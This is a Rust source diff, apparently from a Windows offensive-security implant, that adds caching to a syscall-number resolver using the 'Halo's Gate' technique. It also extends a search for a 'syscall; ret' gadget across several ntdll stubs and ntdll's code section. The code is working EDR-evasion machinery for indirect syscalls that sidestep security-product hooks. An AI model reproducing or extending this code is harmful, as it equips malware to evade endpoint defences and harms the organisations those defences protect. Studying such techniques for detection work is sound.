@@ -425,7 +425,19 @@ pub struct SockAddrIn {
 use crate::utils::api_resolver::{hash_str, resolve_function};
 
 #[cfg(target_os = "windows")]
+static mut SSN_CACHE: [(u32, u16); 64] = [(0, 0); 64];
+#[cfg(target_os = "windows")]
+static mut SSN_CACHE_COUNT: usize = 0;
+
+#[cfg(target_os = "windows")]
 pub unsafe fn get_ssn(function_hash: u32) -> u16 {
+    // 1. Check Cache
+    for i in 0..SSN_CACHE_COUNT {
+        if SSN_CACHE[i].0 == function_hash {
+            return SSN_CACHE[i].1;
+        }
+    }
+
     let ntdll_hash = hash_str(b"ntdll.dll");
     let addr = resolve_function(ntdll_hash, function_hash);
 
@@ -433,24 +445,34 @@ pub unsafe fn get_ssn(function_hash: u32) -> u16 {
         return 0;
     }
 
-    // Try current function
-    if let Some(ssn) = parse_syscall_stub(addr) {
-        return ssn;
+    let mut ssn = 0;
+
+    // 2. Try current function
+    if let Some(s) = parse_syscall_stub(addr) {
+        ssn = s;
+    } else {
+        // Halo's Gate: Check neighbors
+        for i in 1..32 {
+            // Check neighbor above
+            if let Some(s) = parse_syscall_stub(addr.add(i * 32)) {
+                ssn = s - i as u16;
+                break;
+            }
+            // Check neighbor below
+            if let Some(s) = parse_syscall_stub(addr.sub(i * 32)) {
+                ssn = s + i as u16;
+                break;
+            }
+        }
     }
 
-    // Halo's Gate: Check neighbors
-    for i in 1..32 {
-        // Check neighbor above
-        if let Some(ssn) = parse_syscall_stub(addr.add(i * 32)) {
-            return ssn - i as u16;
-        }
-        // Check neighbor below
-        if let Some(ssn) = parse_syscall_stub(addr.sub(i * 32)) {
-            return ssn + i as u16;
-        }
+    // 3. Update Cache
+    if ssn != 0 && SSN_CACHE_COUNT < 64 {
+        SSN_CACHE[SSN_CACHE_COUNT] = (function_hash, ssn);
+        SSN_CACHE_COUNT += 1;
     }
 
-    0
+    ssn
 }
 
 #[cfg(target_os = "windows")]
@@ -485,19 +507,41 @@ unsafe fn get_syscall_gadget() -> Option<*const ()> {
     }
 
     let ntdll_hash = hash_str(b"ntdll.dll");
-    let func_hash = hash_str(b"NtOpenFile"); 
-    let addr = resolve_function(ntdll_hash, func_hash) as *const u8;
+    
+    // Multiple gadget sources for redundancy
+    let targets = [
+        hash_str(b"NtYieldExecution"),
+        hash_str(b"NtTestAlert"),
+        hash_str(b"NtOpenFile"),
+    ];
 
-    if addr.is_null() { return None; }
+    for &func_hash in &targets {
+        let addr = resolve_function(ntdll_hash, func_hash) as *const u8;
+        if addr.is_null() { continue; }
 
-    // Scan for syscall; ret (0F 05 C3)
-    for i in 0..32 {
-        if *addr.add(i) == 0x0F && *addr.add(i + 1) == 0x05 && *addr.add(i + 2) == 0xC3 {
-            let gadget = addr.add(i) as *const ();
-            SYSCALL_GADGET = Some(gadget);
-            return Some(gadget);
+        // Scan for syscall; ret (0F 05 C3) within the function stub
+        for i in 0..32 {
+            if *addr.add(i) == 0x0F && *addr.add(i + 1) == 0x05 && *addr.add(i + 2) == 0xC3 {
+                let gadget = addr.add(i) as *const ();
+                SYSCALL_GADGET = Some(gadget);
+                return Some(gadget);
+            }
         }
     }
+
+    // Egg hunt fallback: Scan ntdll .text section (simplified search)
+    if let Some(ntdll_base) = crate::utils::api_resolver::get_module_base(ntdll_hash) {
+        let p = ntdll_base as *const u8;
+        // Search first 4KB for a gadget if function stubs failed
+        for i in 0..4096 {
+            if *p.add(i) == 0x0F && *p.add(i + 1) == 0x05 && *p.add(i + 2) == 0xC3 {
+                let gadget = p.add(i) as *const ();
+                SYSCALL_GADGET = Some(gadget);
+                return Some(gadget);
+            }
+        }
+    }
+
     None
 }
 
